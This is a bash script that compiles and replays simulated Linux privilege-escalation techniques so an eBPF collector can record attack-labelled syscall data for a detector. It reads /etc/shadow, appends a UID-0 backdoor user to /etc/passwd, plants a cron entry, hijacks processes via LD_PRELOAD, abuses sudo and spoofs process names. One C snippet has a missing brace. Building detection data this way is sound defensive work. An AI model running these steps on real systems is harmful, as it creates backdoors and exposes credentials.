#!/bin/bash
# Attack Simulation Script for eBPF Data Collection  
#
# Generates diverse privilege-escalation-like syscall patterns.
# Loops continuously for a configurable duration (default 5 minutes).
#
# v4 adds: SUID discovery, sudo misconfiguration abuse, cron/systemd
# persistence tampering, LD_PRELOAD hijacking, writable /etc/passwd
# exploitation, and a web-shell-style sudden shell spawn — techniques
# missing from v3's coverage (which was mostly setuid/ptrace/namespace/
# capset patterns). v4 also rebalances single-shot vs. looped attacks:
# real exploits usually call setuid(0) once, not fifty times in a loop —
# if bursty patterns dominate the attack class, the model risks learning
# "repeated privilege syscalls" as the signal instead of "a privilege
# syscall happened in a suspicious context at all," which would miss
# realistic single-shot attacks. Most v4 additions are single-shot.
#
# All C payloads are compiled ONCE up front, then just executed on every cycle 
#
# Run in a SEPARATE terminal while:  collector.py --label attack
#
# Usage:
#   sudo bash simulate_attacks.sh              # 300s default
#   sudo bash simulate_attacks.sh --duration 600  # 10 minutes
#

# Parse --duration argument
DURATION=300
while [[ $# -gt 0 ]]; do
    case "$1" in
        --duration) DURATION="$2"; shift 2 ;;
        *) shift ;;
    esac
done

WORKDIR=$(mktemp -d /tmp/pe_attack_sim.XXXXXX)
trap "rm -rf $WORKDIR" EXIT


echo "  Privilege escalation attack simulator "
echo "  Target duration : ${DURATION}s"
echo "  Working directory: $WORKDIR"
echo

# Helper: compiling c file 
compile() {
    gcc -o "$WORKDIR/$1" "$WORKDIR/$1.c" 2>/dev/null && return 0
    echo "  [warn] gcc failed for $1, skipping." && return 1
}

# writing and compiling every attack payload once before the timed loop
echo "Building attack payloads..."

cat > "$WORKDIR/suid_exploit.c" << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("Attempting setuid(0)...\n");

    int ret = setuid(0);
    printf("setuid(0) returned: %d\n", ret);

    ret = setgid(0);
    printf("setgid(0) returned: %d\n", ret);

    char *args[] = {"/bin/sh", "-c", "echo 'escalation attempt'; id; whoami", NULL};
    execve("/bin/sh", args, NULL);

    return 0;
}
CEOF
compile suid_exploit && chmod u+s "$WORKDIR/suid_exploit"

cat > "$WORKDIR/rapid_chain.c" << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("Starting rapid privilege syscall chain...\n");
    for (int i = 0; i < 30; i++) {
        setuid(0);
        setgid(0);
        setreuid(0, 0);
        setregid(0, 0);
    }
    printf("Rapid chain complete.\n");

    char *args[] = {"/bin/echo", "chain-execve-done", NULL};
    execve("/bin/echo", args, NULL);

    return 0;
}
CEOF
compile rapid_chain

cat > "$WORKDIR/stealthy.c" << 'CEOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <time.h>

static void nsleep(long ms) {
    struct timespec ts = {ms/1000, (ms%1000)*1000000L};
    nanosleep(&ts, NULL);
}

int main() {
    printf("Stealthy escalation: spacing calls 200ms apart\n");
    for (int i = 0; i < 10; i++) {
        setuid(0);
        nsleep(200);
        setresuid(0, 0, 0);
        nsleep(200);
        setresgid(0, 0, 0);
        nsleep(200);
    }
    /* Final execve, shell spawning after privilege attempt */
    char *args[] = {"/bin/sh", "-c", "id", NULL};
    execve("/bin/sh", args, NULL);
    return 0;
}
CEOF
compile stealthy

cat > "$WORKDIR/ptrace_sim.c" << 'CEOF'
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

int main(){
    pid_t child = fork();

    if(child == 0) 
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execve("/bin/echo", (char*[]){"echo","traced",NULL}, NULL);
    }else{
        int status;
        waitpid(child, &status, 0);

        printf("ptrace attached to child PID %d\n", child);
        ptrace(PTRACE_CONT, child, NULL, NULL);

        waitpid(child, &status, 0);
    }
    return 0;
}
CEOF
compile ptrace_sim

cat > "$WORKDIR/namespace_sim.c" << 'CEOF'
#include <stdio.h>
#include <sched.h>
#include <unistd.h>

int main(){
    printf("Attempting unshare(CLONE_NEWUSER)\n");

    int ret = unshare(CLONE_NEWUSER);
    printf("unshare returned: %d\n", ret);

    ret = unshare(CLONE_NEWPID);
    printf("unshare(PID ns) returned: %d\n", ret);

    return 0;
}
CEOF
compile namespace_sim

cat > "$WORKDIR/capset_sim.c" << 'CEOF'
#include <stdio.h>
#include <sys/capability.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/capability.h>

int main() {
    // prctl: change dumpable, set name, etc. 
    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);

    // disguise process name 
    prctl(PR_SET_NAME, "kworker/0:0H", 0, 0, 0);  
    prctl(PR_GET_SECUREBITS, 0, 0, 0, 0);

    // capset: attempting to set all capabilities 

    struct __user_cap_header_struct hdr = {_LINUX_CAPABILITY_VERSION_3, 0};
    struct __user_cap_data_struct data[2] = {};
    data[0].effective   = 0xFFFFFFFF;
    data[0].permitted   = 0xFFFFFFFF;
    data[0].inheritable = 0xFFFFFFFF;
    data[1].effective   = 0xFFFFFFFF;
    data[1].permitted   = 0xFFFFFFFF;
    data[1].inheritable = 0xFFFFFFFF;
    int ret = syscall(SYS_capset, &hdr, data);
    printf("capset returned: %d\n", ret);
    
    return 0;
}
CEOF
gcc -o "$WORKDIR/capset_sim" "$WORKDIR/capset_sim.c" -lcap 2>/dev/null || \
    gcc -o "$WORKDIR/capset_sim" "$WORKDIR/capset_sim.c" 2>/dev/null || \
    echo "  [warn] gcc failed for capset_sim, skipping."

cat > "$WORKDIR/cycle.c" << 'CEOF'
#include <unistd.h>
int main() {
    for (int i = 0; i < 20; i++) {
        setuid(0); 
        setgid(0); 
        setresuid(0,0,0); 
        setresgid(0,0,0);
    }
    char *a[] = {"/bin/sh", "-c", "id", NULL};
    execve("/bin/sh", a, NULL);

    return 0;
}
CEOF
compile cycle

# LD_PRELOAD hijack: a malicious shared library whose constructor fires
# setuid(0) the moment any dynamically-linked binary loads it. A very
# common real technique, especially against sudo env_keep misconfigs.

cat > "$WORKDIR/ld_preload_sim.c" << 'CEOF'
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
static void hijack_init(void) {
    printf("LD_PRELOAD constructor firing, attempting setuid(0)\n");
    setuid(0);
}
CEOF
gcc -shared -fPIC -o "$WORKDIR/libhijack.so" "$WORKDIR/ld_preload_sim.c" 2>/dev/null || \
    echo "  [warn] gcc failed for libhijack.so, skipping."

# Web-shell-style pattern: a process disguised as a server worker suddenly spawning a shell with recon commands — the classic signature
# of a compromised web app / command-injection vulnerability, even without any privilege syscall involved.
cat > "$WORKDIR/webshell_sim.c" << 'CEOF'
#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>

int main() {
    prctl(PR_SET_NAME, "php-fpm", 0, 0, 0);

    printf("simulating web-shell command injection\n");

    char *args[] = {"/bin/sh", "-c", "id; uname -a; whoami", NULL};
    execve("/bin/sh", args, NULL);
    return 0;
}
CEOF
compile webshell_sim

touch "$WORKDIR/fake_suid_binary"

echo "  Build complete."
echo

START_TIME=$(date +%s)
CYCLE=0
sleep 2  # Give collector time to attach

# main timed loop, replays the precompiled payloads
while true; do
    ELAPSED=$(( $(date +%s) - START_TIME ))
    if [ "$ELAPSED" -ge "$DURATION" ]; then
        break
    fi
    echo "[cycle $((CYCLE+1)) | ${ELAPSED}s / ${DURATION}s elapsed]"

    # 1. SUID Program Exploitation Pattern (single-shot) 
    echo "[1/14] Simulating SUID privilege escalation pattern..."
    "$WORKDIR/suid_exploit" || true
    echo "  Done."
    echo

    # 2. Rapid setuid/setgid Chain (bursty)
    echo "[2/14] Simulating rapid setuid/setgid syscall chain..."
    "$WORKDIR/rapid_chain" || true
    echo "  Done."
    echo

    # 3. Slow / Stealthy Attack Pattern 
    # Mimics an attacker who spaces out calls to avoid rate-based detection
    echo "[3/14] Simulating slow/stealthy privilege changes..."
    "$WORKDIR/stealthy" || true
    echo "  Done."
    echo

    # ── 4. SUID Binary Discovery + Recon (single-shot) ────────────────
    # Bounded to standard binary dirs (maxdepth 1, no recursion) — a real
    # attacker checks PATH-like locations first anyway.
    echo "[4/14] Simulating SUID binary discovery..."
    timeout 2 find /usr/bin /usr/sbin /bin /sbin /usr/local/bin \
        -maxdepth 1 -perm -4000 -type f 2>/dev/null \
        | head -5 > "$WORKDIR/suid_candidates.txt" || true
    echo "  Done."
    echo

    # 5. Sensitive File Access 
    echo "[5/14] Simulating suspicious file access patterns..."
    cat /etc/shadow    2>/dev/null | head -3 || true
    cat /etc/sudoers   2>/dev/null | head -3 || true
    cat /etc/gshadow   2>/dev/null | head -3 || true
    ls -la /root/      2>/dev/null | head -5 || true
    cat /proc/kallsyms 2>/dev/null | head -5 || true
    cat /proc/kcore    2>/dev/null | head -c 1 || true
    echo "test" > /etc/pe_test_file 2>/dev/null && rm /etc/pe_test_file 2>/dev/null || true
    echo "  Done."
    echo

    # 6. Suspicious chmod/chown Operations 
    echo "[6/14] Simulating suspicious permission changes..."
    chmod 4755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
    chmod 2755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
    chmod 6755 "$WORKDIR/fake_suid_binary" 2>/dev/null || true
    chown root:root "$WORKDIR/fake_suid_binary" 2>/dev/null || true
    chown root:root /tmp/.test_chown 2>/dev/null || true
    chmod 777 /tmp/.test_chown 2>/dev/null || true
    echo "  Done."
    echo

    # 7. ptrace / Process Injection Pattern 
    echo "[7/14] Simulating ptrace and process manipulation..."
    "$WORKDIR/ptrace_sim" || true
    # Rapid clone/fork burst
    for i in $(seq 1 20); do /bin/true & done
    wait
    echo "  Done."
    echo

    # 8. Namespace / Unshare Manipulation
    echo "[8/14] Simulating namespace escape attempts..."
    # unshare requires root, will fail as non-root — generates the syscall
    unshare --user /bin/id 2>/dev/null || true
    unshare --pid  /bin/id 2>/dev/null || true
    unshare --net  /bin/id 2>/dev/null || true
    "$WORKDIR/namespace_sim" || true
    echo "  Done."
    echo

    # 9. capset / prctl Manipulation
    echo "[9/14] Simulating capability and process attribute manipulation..."
    "$WORKDIR/capset_sim" 2>/dev/null || true
    echo "  Done."
    echo

    # 10. Sudo Misconfiguration Abuse (single-shot) 
    # -n = non-interactive: fail immediately instead of prompting for a password, so the script never hangs waiting for input.
    echo "[10/14] Simulating sudo misconfiguration abuse..."
    sudo -n -l 2>/dev/null | head -5 || true
    sudo -n -u '#-1' /bin/sh -c id 2>/dev/null || true
    sudo -n /bin/sh -c 'id' 2>/dev/null || true
    echo "  Done."
    echo

    # 11. Cron / Systemd Persistence Tampering (single-shot)
    # Generates the write-to-a-persistence-location syscall signal WITHOUT
    # leaving anything behind. We now only touch a throwaway /etc/cron.d file that is written and immediately deleted,
    # so the cron daemon never has time to act on it.

    echo "[11/14] Simulating cron/systemd persistence tampering..."
    crontab -l 2>/dev/null || true
    echo "* * * * * root /tmp/.pe_backdoor" > /etc/cron.d/pe_test 2>/dev/null || true
    cat /etc/cron.d/pe_test 2>/dev/null || true
    rm -f /etc/cron.d/pe_test 2>/dev/null || true
    

    sed -i '/\/tmp\/\.pe_backdoor/d' /etc/crontab 2>/dev/null || true
    echo "  Done."
    echo

    # 12. LD_PRELOAD Hijack (single-shot) 
    echo "[12/14] Simulating LD_PRELOAD hijack..."
    LD_PRELOAD="$WORKDIR/libhijack.so" /bin/true 2>/dev/null || true
    echo "  Done."
    echo

    # 13. Writable /etc/passwd Exploitation (single-shot)
    # Append a UID-0 backdoor entry, exercise it, then remove it in the same step.

    echo "[13/14] Simulating writable /etc/passwd exploitation..."
    echo "pwned:x:0:0:pwned:/root:/bin/bash" >> /etc/passwd 2>/dev/null || true
    su pwned -c id 2>/dev/null || true

    # Remove every injected pwned line (also self-heals prior polluted runs)
    sed -i '/^pwned:x:0:0:pwned:\/root:\/bin\/bash$/d' /etc/passwd 2>/dev/null || true
    echo "  Done."
    echo

    # 14. Web-shell-style Command Injection (single-shot)
    echo "[14/14] Simulating web-shell-style command injection..."
    "$WORKDIR/webshell_sim" || true
    echo "  Done."
    echo

    # repeated mini-cycle for a bit more bursty-pattern coverage 
    "$WORKDIR/cycle" || true

    CYCLE=$((CYCLE + 1))
done

ELAPSED=$(( $(date +%s) - START_TIME ))

echo "  Attack simulation completed."
echo "  Ran $CYCLE full cycle(s) over ${ELAPSED}s."
